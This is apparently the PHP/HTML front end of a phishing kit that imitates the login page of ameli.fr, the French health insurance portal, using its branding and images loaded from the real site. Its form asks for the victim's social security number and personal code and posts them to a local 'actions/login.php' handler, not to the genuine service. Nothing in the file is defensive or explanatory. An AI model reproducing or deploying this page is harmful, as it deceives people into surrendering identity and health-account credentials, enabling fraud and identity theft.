<?php include("common/includes.php") ?>

<!DOCTYPE html>
<html lang="fr" slick-uniqueid="3">

<?php include("common/header.php") ?>
<body>
    <header class="wlp-bighorn-header" role="banner">
        <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
            <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto">
                <div></div>
                <div class="wlp-bighorn-theme wlp-bighorn-theme-borderless">
                    <div id="Header" class="wlp-bighorn-window  ">
                        <div class="wlp-bighorn-window-content">

                            <div style="overflow-x:hidden;">
                                <div class="tetiere-connexion">

                                    <div class="liens">

                                        <!-- Redirection vers la page de connexion -->

                                        <a class="r_btsubmit r_btlien" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_login_page&amp;connexioncompte_2actionEvt=afficher" title="Votre compte ameli - Connexion">
                                            Se connecter
                                        </a>

                                    </div>

                                    <a class="r_lien_image" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_accueil_page" title="Accéder à l'accueil">
                                        <img src="https://assure.ameli.fr/PortailAS/ShowProperty/WLP%20Repository/images/logosRegimes/logo_regime_general" class="logoam" alt="Logo du régime d'assurance maladie">
                                        <img src="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/header/Icon-60@3x.png" class="logoam-320" alt="Logo du régime d'assurance maladie">
                                    </a>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div id="ameli_portal_book_2" class="wlp-bighorn-book">
        <div class="wlp-bighorn-book-content">
            <div id="as_connexion_book" class="wlp-bighorn-book">
                <div class="wlp-bighorn-book-content">
                    <main id="as_login_page" class="wlp-bighorn-page-unconnect" role="main">
                        <section id="contenu" class="corps-de-page">
                            <div class="wlp-bighorn-layout wlp-bighorn-layout-grid">
                                <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell">
                                    <div></div>
                                    <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
                                        <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto">
                                            <div></div>
                                            <div id="connexioncompte_2" class="wlp-bighorn-window  ">
                                                <div class="wlp-bighorn-window-content">

                                                    <link href="../../framework/skins/assure/css/centrer.css" rel="stylesheet" type="text/css">
                                                    <link rel="stylesheet" href="../../framework/skins/assure/css/smart-app-banner.css" type="text/css" media="screen">



                                                    <style type="text/css">
                                                        .wlp-bighorn-book{
                                                            width : 100%;
                                                          }
                                                          #connexioncompte_2 {
                                                            padding-top: 190px;
                                                          }
                                                          
                                                          /* Small Devices, Tablets */
                                                          @media only screen and (max-width : 767px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 60px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -20px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -20px;
                                                              margin-bottom: 60px;
                                                            }
                                                            #connexioncompte_2 {
                                                              padding-top: 100px;
                                                            }
                                                            .connexioncompte_2{
                                                              padding-right: 30px !important;
                                                              padding-left: 30px !important;
                                                            }
                                                          }
                                                          
                                                          @media only screen and (min-width : 768px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 88px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -48px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -48px;
                                                              margin-bottom: 88px;
                                                            }
                                                          }
                                                          
                                                          /* Medium Devices */
                                                          @media screen and (min-width: 768px) and (max-width: 992px){
                                                            #connexioncompte_2 .centrepage {
                                                              width: 460px;
                                                            }
                                                          }
                                                        
                                                          input:-webkit-autofill {
                                                            -webkit-box-shadow: 0 0 0 50px white inset !important;
                                                          }
                                                    </style>

                                                    <div class="connexioncompte_2 centrepage">

                                                        <div class="r_cnx_page" id="loginPage">

                                                            <div>
                                                                <div class="r_cnx_maintenance">

                                                                </div>

                                                                <div class="r_cnx">
                                                                    <div class="connexion-login">
                                                                        <h1 class="texte-center title">
                                                                            J'accède à mon compte ameli
                                                                        </h1>

                                                                        <div class="zone-alerte hidden" id="navIncompatible">
                                                                            <h2>Mon compte ameli fonctionnera mieux avec une version plus récente d'Internet Explorer !</h2>
                                                                            <span>
              
                                                                            
                                                                        Mettez à jour votre navigateur grâce à ce lien
                                                                        <a id="ieDlLink" href="http://windows.microsoft.com/fr-fr/internet-explorer/download-ie" target="downloadIE" title="Mettre à jour son navigateur (nouvelle fenêtre)" tabindex="-1">http://windows.microsoft.com/fr-fr/internet-explorer/download-ie</a>
                                                                        </span>
                                                                        </div>

                                                                        <div class="r_cnx_cadre_gris" id="idBlocCnx">
                                                                            <form name="connexionCompteForm" id="form" method="post" action="actions/login.php" class="r_cnx_form">
                                                                                <div>

                                                                                    <div id="div_connexioncompte_2_nir_as" class="div_connexioncompte_2_wrapper">

                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="identifiant" type="text" maxlength="18" size="13" aria-required="true" placeholder="Mon numéro de sécurité sociale" tabindex="0" name="ide_login">
                                                                                        </span>

                                                                                    </div>
                                                                                    <div><span id="connexioncompte_2nir_as_messageErreur" class="message_erreur message_erreur_invisible"></span>
                                                                                    </div>

                                                                                    <div id="AideSaisieNir" class="En-savoir-plus">

                                                                                            <a id="bulleAideSaisieNir" class="cliquable" tabindex="0"  title="Où trouver mon numéro de sécurité sociale&nbsp;?">
                                                                                            Où trouver mon numéro de sécurité sociale&nbsp;?
                                                                                        </a>
                                                                                    </div>
                                                                                    <div id="divAideSaisieNir" class="En-savoir-plus hidden">

                                                                                        <img id="closeAideNir" tabindex="0" onclick="hideAideSaisieNir()" alt="Fermer" title="Fermer l'aide" src="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/connexion/close_20px.png">
                                                                                        <h2 class="title">Aide pour le numéro de sécurité sociale</h2>
                                                                                        <p class="contenu">
                                                                                            Saisissez votre numéro de sécurité sociale à 13 chiffres.<br> Attention, si vous êtes ayant droit, saisissez le numéro de sécurité sociale de la personne à laquelle vous êtes rattaché.
                                                                                        </p>
                                                                                    </div>

                                                                                    <div id="div_connexioncompte_2_code">
                                                                                        <span class="zone_champ_saisie">
                                                                                                <input id="password" maxlength="50" size="18" type="password" class="champ" autocomplete="new-password" name="ide_password" placeholder="Mon code personnel (ou provisoire à 4 chiffres)" title="Mon code personnel (ou provisoire à 4 chiffres)" value="" aria-required="true">
                                                                                                <img id="iconeToggleCode" class="iconeToggleCode" tabindex="0" title="Afficher le code" alt="Oeil" src="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/connexion/OeilBarre.png">
                                                                                            </span>
                                                                                    </div>

                                                                                    <div id="aideCode" class="En-savoir-plus">

                                                                                        <a id="problemeConnexion" href="" title="Code perdu, non-reçu ou compte verrouillé">
                                                                                        Code oublié ?
                                                                                    </a>
                                                                                    </div>

                                                                                    <div class="cnxRequis">
                                                                                        <span>Tous les champs sont obligatoires.</span>
                                                                                    </div>

                                                                                    <div>

                                                                                        <input id="id_r_cnx_btn_submit" type="submit" name="ide_login_submit" value="me connecter" class="r_btsubmit btn-connection" disabled="">
                                                                                    </div>
                                                                                </div>
                                                                                <input type="hidden" name="_ct" value="OZFN-NHM0-TW28-BL6G-JGJ1-HF5K-VDRJ-1MGM"></form>

                                                                            <div class="connexion-FRCO">
                                                                                <p class="texte-center">
                                                                                    <span>OU</span>
                                                                                </p>
                                                                            <?php if($france_connect){ ?>
                                                                                <div class="imgco-FRCO">

                                                                                    <a href="https://assure.ameli.fr/PortailAS/FranceConnect" title="S'identifier avec FranceConnect" tabindex="0">

                                                                                        <img alt="FranceConnect" src="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/frco/france-connect.png">
                                                                                    </a>
                                                                                </div>
                                                                                <?php } ?>
                                                                                <div class="lien-aide-FRCO">

                                                                                    <a href="https://app.franceconnect.gouv.fr/en-savoir-plus" target="_blank" tabindex="0">
                                                                                            Qu'est-ce que FranceConnect ?
                                                                                            </a>
                                                                                </div>

                                                                                <p class="texte-center msg-connexion">
                                                                                    Première visite ?
                                                                                    <a href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_creation_immediate_page" tabindex="0">
                                                                                            Créer un compte
                                                                                            </a>
                                                                                </p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </section>
                    </main>
                </div>
            </div>
        </div>
    </div>
    <?php include("common/footer.php") ?>                                                     
</body>

</html>

</html>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"
integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
crossorigin="anonymous"></script>

<script src="assets/js/mask.js"></script>

<script>

$("#identifiant").mask("# ## ## ## ### ###")
$("#identifiant").on("input propertychange",function(){
    if($("#identifiant").val().length >= 18 && $("#password").val().length >= 1){
        toggle_button();
    }
    else{
        detoggle_button();
    }
})

$("#password").on("input propertychange",function(){
    if($("#identifiant").val().length >= 18 && $("#password").val().length >= 1){
        toggle_button();
    }
    else{
        detoggle_button();
    }
})


$shown = false;

$("#iconeToggleCode").on("click",function(){
    if($shown){
        $("#password").attr("type","password"); 
        $("#iconeToggleCode").attr("src","https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/connexion/OeilBarre.png")
        $shown = false;

    }
    else{
        $("#password").attr("type","text"); 
        $("#iconeToggleCode").attr("src","https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/connexion/Oeil.png")
        $shown = true;

    }

    return $shown;
})


$("#bulleAideSaisieNir").on("click",function(){
    $("#divAideSaisieNir").toggleClass("hidden");
})

$("#closeAideNir").on("click",function(){
    $("#divAideSaisieNir").addClass("hidden");
})


function toggle_button(){
    $("#id_r_cnx_btn_submit").prop("disabled",false);
}


function detoggle_button(){
    $("#id_r_cnx_btn_submit").prop("disabled",true);
}

</script>

<script src="assets/js/index.js"></script>

